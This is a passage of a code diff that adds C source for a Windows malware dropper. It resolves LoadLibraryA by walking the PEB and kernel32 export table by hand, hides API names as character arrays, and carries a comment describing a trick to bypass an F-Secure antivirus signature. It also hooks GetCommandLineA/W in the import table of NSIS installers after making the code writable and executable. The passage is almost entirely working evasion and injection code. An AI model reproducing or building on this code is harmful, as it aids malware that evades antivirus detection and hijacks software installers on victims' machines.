+		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
+			goto NEXT_ENTRY;
+		
+		// *** get EXPORT table
+		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
+			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+		
+		// *** check for valid module name
+		char* moduleName = (char*)(imageBase + exportDirectory->Name);
+		if (moduleName == NULL)
+			goto NEXT_ENTRY;
+		
+		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
+		{
+			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
+			
+			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
+			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
+			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
+			
+			// *** get pointers to LoadLibraryA and GetProcAddress entry points
+			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
+			{
+				if (Functions[x] == 0)
+					continue;
+				
+				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
+				{
+					if (NameOrds[y] == x)
+					{
+						char *name = (char *) (imageBase + Names[y]);
+						if (name == NULL)
+							continue;
+						
+						if (!_STRCMPI_(strLoadLibraryA, name))
+							return (LOADLIBRARY)(imageBase + Functions[x]);
+						break;
+					}
+				}
+			}
+		}
+NEXT_ENTRY:
+		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
+	
+	} while (entry != head);
+
+	return 0;
+}
+
+
+__forceinline VOID FixInstallers(PMY_DATA pData)
+{
+	PIMAGE_DOS_HEADER pDosHeader;
+	PIMAGE_NT_HEADERS32 pNtHeaders;
+	PIMAGE_SECTION_HEADER pSectionHeader;
+	LPVOID pBaseAddress = pData->GetModuleHandleA(NULL);
+	
+	CHAR strNData[] = { '.', 'n', 'd', 'a', 't', 'a', 0x0};
+	CHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	CHAR strGetCommandLineA[] = { 'G', 'e', 't', 'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L', 'i', 'n', 'e', 'A', 0x0 };
+	CHAR strGetCommandLineW[] = { 'G', 'e', 't', 'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L', 'i', 'n', 'e', 'W', 0x0 };
+
+	pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddress;
+	pNtHeaders = (PIMAGE_NT_HEADERS32) (((PBYTE)pDosHeader) + pDosHeader->e_lfanew);
+	pSectionHeader = (PIMAGE_SECTION_HEADER) (pNtHeaders + 1);
+
+	for (DWORD i=0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
+	{		
+		if (!_STRCMP_((PCHAR)pSectionHeader[i].Name, strNData))
+		{
+			ULONG uOldProtect;
+			GETCOMMANDLINEA pfn_GetCommandLineAHook = (GETCOMMANDLINEA) ( ((PBYTE)pData->header) + pData->header->functions.GetCommandLineAHook.offset);
+			GETCOMMANDLINEW pfn_GetCommandLineWHook = (GETCOMMANDLINEW) ( ((PBYTE)pData->header) + pData->header->functions.GetCommandLineWHook.offset);
+
+			pData->VirtualProtect(pfn_GetCommandLineAHook, pData->header->functions.GetCommandLineAHook.size, PAGE_EXECUTE_READWRITE, &uOldProtect);
+			pData->VirtualProtect(pfn_GetCommandLineWHook, pData->header->functions.GetCommandLineWHook.size, PAGE_EXECUTE_READWRITE, &uOldProtect);
+
+			HOOKIAT pfn_HookIAT = (HOOKIAT) (((PCHAR)pData->header) + pData->header->functions.hookCall.offset);
+
+			pfn_HookIAT(strKernel32, 
+				strGetCommandLineA, 
+				(DWORD)pfn_GetCommandLineAHook,
+				pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
+				(DWORD)pBaseAddress,
+				pData);
+
+			pfn_HookIAT(strKernel32, 
+				strGetCommandLineW, 
+				(DWORD)pfn_GetCommandLineWHook,
+				pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
+				(DWORD)pBaseAddress,
+				pData);
+		}
+	}
+}
+
+
+#pragma code_seg()
+#pragma optimize( "", on )
+
+#endif // _DROPPER_COMMON
